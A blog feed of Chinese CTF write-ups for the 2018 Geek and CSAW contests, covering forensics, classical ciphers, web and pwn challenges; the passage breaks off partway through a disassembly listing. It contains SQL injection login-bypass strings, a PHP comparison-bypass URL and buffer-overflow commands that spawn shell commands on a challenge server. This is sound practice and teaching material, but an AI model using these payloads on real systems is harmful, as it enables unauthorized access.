    <content type="html"><![CDATA[<h2 id="初来乍到"><a href="#初来乍到" class="headerlink" title="初来乍到"></a>初来乍到</h2><p>查看源码</p><p>flag: SYC{View_Page_Source_to_Get_Flag} </p><h2 id="代号为geek的行动第二幕：废弃的地下黑客论坛"><a href="#代号为geek的行动第二幕：废弃的地下黑客论坛" class="headerlink" title="代号为geek的行动第二幕：废弃的地下黑客论坛"></a>代号为geek的行动第二幕：废弃的地下黑客论坛</h2><p>登录框,放到sqlmap上面跑了下，没有注入，可是根据<code>The sql you execute in final :select * from users where username=&#39;admin&#39;&quot;&quot;&#39; and password=&#39;admi</code></p><p>判断可能是王能密码，尝试<code>username=admin&#39; or 1=1-- -&amp;password=admin</code></p><p>结果提示<code>hack!!! The length of username and password should not exceed 15.</code></p><p>参考<a href="https://www.secpulse.com/archives/76200.html这篇文章" target="_blank" rel="noopener">https://www.secpulse.com/archives/76200.html这篇文章</a>,<br>提交<code>username=xx&#39;=&#39;&amp;password=xx&#39;=&#39;</code></p><p>flag:<code>SYC{h4ck-by-l0c4l6uy-23333333333}</code></p><h2 id="萌萌的血小板"><a href="#萌萌的血小板" class="headerlink" title="萌萌的血小板"></a>萌萌的血小板</h2><p><img src="https://i.loli.net/2018/10/10/5bbe080a27795.gif" alt="platelet.gif"></p><p>下载gif文件，binwalk分析有个rar，修改后缀名为rar，解压,得到一个flag.txt和一个与佛论禅 的提示.</p><p>flag.txt<br><code>哆真阿怯菩諦勝缽室不俱悉孕怯豆皤爍缽槃缽舍竟奢迦竟姪俱伊藐俱多蘇罰苦侄帝諳寫缽寫夷若侄菩羯逝除薩伽豆提呐上罰謹俱尼缽地能冥無恐遠咒薩不姪所</code></p><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a><br>到这个网站在线解密下<br>flag:<code>SYC{F1ag_1Ssss_th1s!!!}</code></p><h2 id="小帅圆圆的发际线，你也想要么？"><a href="#小帅圆圆的发际线，你也想要么？" class="headerlink" title="小帅圆圆的发际线，你也想要么？"></a>小帅圆圆的发际线，你也想要么？</h2><p><img src="https://i.loli.net/2018/10/10/5bbe080952e43.jpg" alt="777.jpg"></p><p>直接foremost分离rar文件，里面有个666.jpg，<code>strings</code>一下,得到这个字符串</p><p><img src="https://i.loli.net/2018/10/10/5bbe08095182d.jpg" alt="666.jpg"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +.+++ +++.&lt; ++++[ -&gt;--- -&lt;]&gt;- ----- .&lt;+++</span><br><span class="line">++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; ---.. ....- ----- ---.&lt;</span><br><span class="line">+++++ [-&gt;-- ---&lt;] &gt;---- ..... .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+</span><br><span class="line">+++[- &gt;---- &lt;]&gt;-. +++++ +++.+ ++++. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +++..</span><br><span class="line">..&lt;++ ++[-&gt; ----&lt; ]&gt;--. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .&lt;+++ ++[-&gt; +++++</span><br><span class="line">&lt;]&gt;+. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]</span><br><span class="line">&gt;++++ +.&lt;++ ++[-&gt; ----&lt; ]&gt;--- ---.. +++++ +++.+ +++++ ++.++ +++.&lt; ++++[</span><br><span class="line">-&gt;--- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;+. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ +++++ +[-&gt;-</span><br><span class="line">----- ---&lt;] &gt;--.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ +++++ .&lt;</span><br></pre></td></tr></table></figure><p>解密<a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p><p>flag:<code>SYC{hhhhhh_BBBBBBrainfuuuuck_y0u__got_it!}</code></p><h2 id="幸运大挑战"><a href="#幸运大挑战" class="headerlink" title="幸运大挑战"></a>幸运大挑战</h2><p>他有一个计时器，必须要10.00才有flag，人手点是不可能的，仔细看发的包</p><p><img src="https://i.loli.net/2018/10/10/5bbe0fea77c20.png" alt=""></p><p>计时器的数字直接显示在url中，直接修改即刻</p><p><img src="https://i.loli.net/2018/10/10/5bbe0fea4b08b.png" alt=""></p><p>flag:<code>SYC{evoA_U_are_V3ry_FanTaStic_2_G3t_l0!}</code></p><h2 id="一起来和php撸猫啊"><a href="#一起来和php撸猫啊" class="headerlink" title="一起来和php撸猫啊"></a>一起来和php撸猫啊</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'p1'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'p1'</span>] &gt; <span class="number">99999999</span> &amp;&amp; strlen($_GET[<span class="string">'p1'</span>]) &lt; <span class="number">9</span>)&#123;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span> ( $_GET [<span class="string">'p2'</span>] )) &#123;</span><br><span class="line">                $p2 = $_GET [<span class="string">'p2'</span>];</span><br><span class="line">                <span class="keyword">if</span> (is_numeric($p2))&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">'Input cannot be a number!!!'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">switch</span> ($p2) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                            <span class="keyword">break</span>;  </span><br><span class="line">                        <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxx&#125;"</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        <span class="keyword">default</span> :</span><br><span class="line">                            <span class="keyword">echo</span> <span class="string">"2333333"</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计一波，基本要判断要绕过<code>($_GET[&#39;p1&#39;] &gt; 99999999 &amp;&amp; strlen($_GET[&#39;p1&#39;]) &lt; 9)</code>，这个直接使用数组来绕，然后<code>p2</code>要是<code>2</code>但不能是数字，在数字后面加上字母即刻绕过了,<br>可以参考这篇文章<a href="http://www.hackblog.cn/post/72.html" target="_blank" rel="noopener">http://www.hackblog.cn/post/72.html</a></p><blockquote><p>test.php?num=8 在 8 后面加任何除数字之外的字母或者符号即可绕过。比如 test.php?num=8a，甚至test.php?num=8%20，加一个空格就可以绕过</p></blockquote><p>payload:<code>http://babycat.game.sycsec.com/?p1=10e9&amp;p2=2a</code></p><p>flag:<code>SYC{pHP_1s_th3_most_p0werfu11}</code></p><h2 id="暗网追击"><a href="#暗网追击" class="headerlink" title="暗网追击"></a>暗网追击</h2><p>打开提示没有权限，抓包直接修改</p><p><img src="https://i.loli.net/2018/10/10/5bbe16e088a7f.png" alt="DeepinScrot-1117.png"></p><p>打开链接<a href="http://admin.game.sycsec.com/caveira-pixel-cores_main-article_f4lg.jpg" target="_blank" rel="noopener">http://admin.game.sycsec.com/caveira-pixel-cores_main-article_f4lg.jpg</a></p><p><img src="https://i.loli.net/2018/10/10/5bbe16809ce88.jpg" alt="caveira-pixel-cores_main-article_f4lg.jpg"></p><p>SYC{w3lc0m3-4dm1n}</p><h2 id="陈师傅线代考了满分？"><a href="#陈师傅线代考了满分？" class="headerlink" title="陈师傅线代考了满分？"></a>陈师傅线代考了满分？</h2><p>题目:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">在陈师傅的线代书上发现了一个奇怪的矩阵，旁边还写着：希尔密码 </span><br><span class="line">(1, 2, 1, 2, 1) </span><br><span class="line">(1, 1, 1, 2, 1) </span><br><span class="line">(2, 2, 1, 2, 1)</span><br><span class="line">(2, 1, 2, 3, 1) </span><br><span class="line">(2, 1, 1, 2, 2) </span><br><span class="line"> 下面一个奇怪的字符串:EGWYQ，你能猜到陈师傅加密了什么吗？ flag格式:SYC&#123;你解密的内容&#125;</span><br></pre></td></tr></table></figure></p><p>hill密码，首先要算出逆矩阵，在线：<a href="http://www.yunsuanzi.com/matrixcomputations/solvematrixinverse.html" target="_blank" rel="noopener">http://www.yunsuanzi.com/matrixcomputations/solvematrixinverse.html</a></p><p>直接上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:UTF-8</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">cip = <span class="string">"egwyq"</span><span class="comment">#密文</span></span><br><span class="line">key = [[<span class="number">-1</span>,<span class="number">-0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>],[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-0</span>,<span class="number">-0</span>],[<span class="number">3</span>,<span class="number">-5</span>,<span class="number">-2</span>,<span class="number">2</span>,<span class="number">1</span>],[<span class="number">-2</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>],[<span class="number">1</span>,<span class="number">-1</span>,<span class="number">-1</span>,<span class="number">-0</span>,<span class="number">1</span>]]</span><br><span class="line"><span class="comment">#上面的逆矩阵</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#秘钥逆矩阵的行数</span></span><br><span class="line">hang_len = len(key)</span><br><span class="line"></span><br><span class="line"><span class="comment">#取下标值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pla_index</span><span class="params">(strs)</span>:</span></span><br><span class="line">       result = []</span><br><span class="line">       <span class="keyword">for</span> i <span class="keyword">in</span> strs:</span><br><span class="line">              result.append(ord(i)<span class="number">-97</span>)</span><br><span class="line">       <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#将密文根据秘钥逆矩阵长度分组，取下标，存入列表</span></span><br><span class="line">cip_group = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(cip),hang_len):</span><br><span class="line">       a = <span class="string">""</span></span><br><span class="line">       a = cip[i:i+hang_len]</span><br><span class="line">       cip_group.append(list(pla_index(a)))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#矩阵相乘，结果存入result中，是一个二维数组</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cip_group:</span><br><span class="line">       result.append(list(np.dot(key,i) % <span class="number">26</span>))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#遍历result，转成明文</span></span><br><span class="line">pla = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">       <span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">              pla += chr(j + <span class="number">97</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"解密后的结果为："</span></span><br><span class="line"><span class="keyword">print</span> pla</span><br></pre></td></tr></table></figure><p>解密得到<code>sycys</code>,提交的时候要大写!!</p><p>flag:<code>SYC{SYCYS}</code></p><h2 id="可能没有你想的那么难"><a href="#可能没有你想的那么难" class="headerlink" title="可能没有你想的那么难"></a>可能没有你想的那么难</h2><p>什么工具不重要，做得出来最重要<br><a href="https://pan.baidu.com/s/1SAdcLshlihkIZ1vZrOG_4Q" target="_blank" rel="noopener">https://pan.baidu.com/s/1SAdcLshlihkIZ1vZrOG_4Q</a> 提取码: v1wy </p><p>下载exe文件，直接strings</p><p>flag:<code>SYC{y0u_kNow_lt_easy}</code></p><h2 id="geek番外篇之废弃的地下黑客论坛"><a href="#geek番外篇之废弃的地下黑客论坛" class="headerlink" title="geek番外篇之废弃的地下黑客论坛"></a>geek番外篇之废弃的地下黑客论坛</h2><p>和之前呢个登录差不多，<br>payload:<code>username=\&amp;password=|0#\</code>或者<code>username=\&amp;password=&amp;1#\</code><br><code>\</code>转义单引号,后面我也不知道，可能是保证值为真就行吧</p><p>flag:<code>SYC{yun-we1-ya0-be1-gu0}</code></p><h2 id="代号为geek的行动第四幕：绝密情报"><a href="#代号为geek的行动第四幕：绝密情报" class="headerlink" title="代号为geek的行动第四幕：绝密情报"></a>代号为geek的行动第四幕：绝密情报</h2><p>点开连接给了源码，代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_GET)||!<span class="keyword">empty</span>($_POST))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"syclover"</span>,$_GET[<span class="string">'id'</span>])) &#123;</span><br><span class="line">          <span class="keyword">echo</span>(<span class="string">"&lt;p&gt;you're a gay, not allowed !&lt;/p&gt;"</span>);</span><br><span class="line">          <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_GET[<span class="string">'id'</span>] = urldecode($_GET[<span class="string">'id'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'id'</span>] == <span class="string">"syclover"</span>)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Wow~ ,You're smart, Access granted!&lt;/p&gt;"</span>;</span><br><span class="line"></span><br><span class="line">          $f = $_POST[file];</span><br><span class="line">          $str = $f.<span class="string">".php"</span>;</span><br><span class="line">        @<span class="keyword">require</span> $str; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">          @<span class="keyword">require</span>(<span class="string">'showpass.php'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="string">"index.php"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2018/10/12/5bc0aa8ad32d1.png" alt=""></p><p>flag:<code>SYC{LF1_S0_E@sy_I_L0ve_Sec}</code></p><h2 id="无题"><a href="#无题" class="headerlink" title="无题"></a>无题</h2><p>蒙师傅说这是他抓智能设备的通信的数据包，说不用题目描述了，直接放tip：flag就在数据包里，明显的不能在明显了。所以.。。提交flag的时候，请把flag四个字母改成SYC再提交！<br>题目链接：<a href="https://pan.baidu.com/s/1SJmjEs7WaGaT3S3cgRrxAQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1SJmjEs7WaGaT3S3cgRrxAQ</a><br>提取码：ejvo </p><p>下载一个流量包，基本查看下</p><p><img src="https://i.loli.net/2018/10/12/5bc0afb7b2545.png" alt=""></p><p>保存分组字节为一个压缩包</p><p><img src="https://i.loli.net/2018/10/12/5bc0b1191e21b.png" alt=""></p><p>直接使用foremost来分离，得到一个flag文件</p><p>flag:<code>SYC{4f90b47d-86c0-4b0e-8090-cf2eb05f15bc}</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;初来乍到&quot;&gt;&lt;a href=&quot;#初来乍到&quot; class=&quot;headerlink&quot; title=&quot;初来乍到&quot;&gt;&lt;/a&gt;初来乍到&lt;/h2&gt;&lt;p&gt;查看源码&lt;/p&gt;
&lt;p&gt;flag: SYC{View_Page_Source_to_Get_Flag} &lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://threst.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>csaw 2018 wp</title>
    <link href="https://threst.github.io/2018/10/04/csaw2018wp/"/>
    <id>https://threst.github.io/2018/10/04/csaw2018wp/</id>
    <published>2018-10-04T05:34:14.000Z</published>
    <updated>2018-10-04T07:21:38.193Z</updated>
    
    <content type="html"><![CDATA[<p>首发安全脉搏:<a href="https://www.secpulse.com/archives/75785.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75785.html</a></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="babycrypto"><a href="#babycrypto" class="headerlink" title="babycrypto"></a>babycrypto</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet</span><br><span class="line">single yeet yeeted with single yeet == 0</span><br><span class="line">yeeet</span><br><span class="line">what is yeet?</span><br><span class="line">yeet is yeet</span><br><span class="line">Yeetdate: yeeted yeet at yeet: 9:42 pm</span><br></pre></td></tr></table></figure></p><p>提示<code>single yeet yeeted with single yeet == 0</code><br>想到<code>a XOR a == 0</code>,可能是单字的xor加密</p><p>ciphertext</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==</span><br></pre></td></tr></table></figure><p>首先要将密文base64解码，再进行xor运算,脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">ciphertext = b64decode(<span class="string">"s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg=="</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    plaintext = xor(key, ciphertext)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"flag&#123;"</span> <span class="keyword">in</span> plaintext:</span><br><span class="line">        <span class="keyword">print</span> plaintext</span><br></pre></td></tr></table></figure></p><p>flag:<code>flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH}</code></p><h3 id="flatcrypt"><a href="#flatcrypt" class="headerlink" title="flatcrypt"></a>flatcrypt</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no logos or branding for this bug</span><br><span class="line"></span><br><span class="line">Take your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043</span><br><span class="line"></span><br><span class="line">flag is not in flag format. flag is PROBLEM_KEY</span><br></pre></td></tr></table></figure></p><p>serv-distribute.py<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">ENCRYPT_KEY = bytes.fromhex(<span class="string">'0000000000000000000000000000000000000000000000000000000000000000'</span>)</span><br><span class="line"><span class="comment"># Determine this key.</span></span><br><span class="line"><span class="comment"># Character set: lowercase letters and underscore</span></span><br><span class="line">PROBLEM_KEY = <span class="string">'not_the_flag'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data, ctr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    f = input(<span class="string">"Encrypting service\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> len(f) &lt; <span class="number">20</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    enc = encrypt(bytes((PROBLEM_KEY + f).encode(<span class="string">'utf-8'</span>)), Counter.new(<span class="number">64</span>, prefix=os.urandom(<span class="number">8</span>)))</span><br><span class="line">    print(<span class="string">"%s%s"</span> %(enc, chr(len(enc))))</span><br></pre></td></tr></table></figure></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="bigboy"><a href="#bigboy" class="headerlink" title="bigboy"></a>bigboy</h3><p>题目<code>nc pwn.chal.csaw.io 9000</code></p><p><img src="https://i.loli.net/2018/09/18/5ba0f9d237bc0.png" alt=""></p><p>无论输入什么都只打印一个时间就退出了,拖进ida看看</p><p><img src="https://i.loli.net/2018/09/19/5ba2401be83b4.png" alt=""></p><p>我们要将程序将跳转到调用系统的函数才可以。</p><p><img src="https://i.loli.net/2018/09/19/5ba2401be196b.png" alt=""></p><p>修改eax的值</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xca&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cd2b06.png" alt=""></p><p>看看有些什么</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcals&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cd5d22.png" alt=""></p><p>有个flag.txt</p><p><code>nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcacat flag.txt&#39;&quot;)</code></p><p><img src="https://i.loli.net/2018/09/19/5ba23f9cdf3e3.png" alt=""></p><p>flag:<code>flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}</code></p><h3 id="get-it"><a href="#get-it" class="headerlink" title="get it?"></a>get it?</h3><p>题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Do you get it?</span><br><span class="line">nc pwn.chal.csaw.io 9001</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2018/09/19/5ba247605f46e.png" alt=""></p><p>无论输入什么都会重复你输入的然后退出。</p><p><code>objdump -d get_it</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00000000004005b6 &lt;give_shell&gt;:</span><br><span class="line">  4005b6:   55                      push   %rbp</span><br><span class="line">  4005b7:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  4005ba:   bf 84 06 40 00          mov    $0x400684,%edi</span><br><span class="line">  4005bf:   e8 bc fe ff ff          callq  400480 &lt;system@plt&gt;</span><br><span class="line">  4005c4:   90                      nop</span><br><span class="line">  4005c5:   5d                      pop    %rbp</span><br><span class="line">  4005c6:   c3                      retq   </span><br><span class="line"></span><br><span class="line">00000000004005c7 &lt;main&gt;:</span><br><span class="line">  4005c7:   55                      push   %rbp</span><br><span class="line">  4005c8:   48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  4005cb:   48 83 ec 30             sub    $0x30,%rsp</span><br><span class="line">  4005cf:   89 7d dc                mov    %edi,-0x24(%rbp)</span><br><span class="line">  4005d2:   48 89 75 d0             mov    %rsi,-0x30(%rbp)</span><br><span class="line">  4005d6:   bf 8e 06 40 00          mov    $0x40068e,%edi</span><br><span class="line">  4005db:   e8 90 fe ff ff          callq  400470 &lt;puts@plt&gt;</span><br><span class="line">  4005e0:   48 8d 45 e0             lea    -0x20(%rbp),%rax</span><br><span class="line">  4005e4:   48 89 c7                mov    %rax,%rdi</span><br><span class="line">  4005e7:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  4005ec:   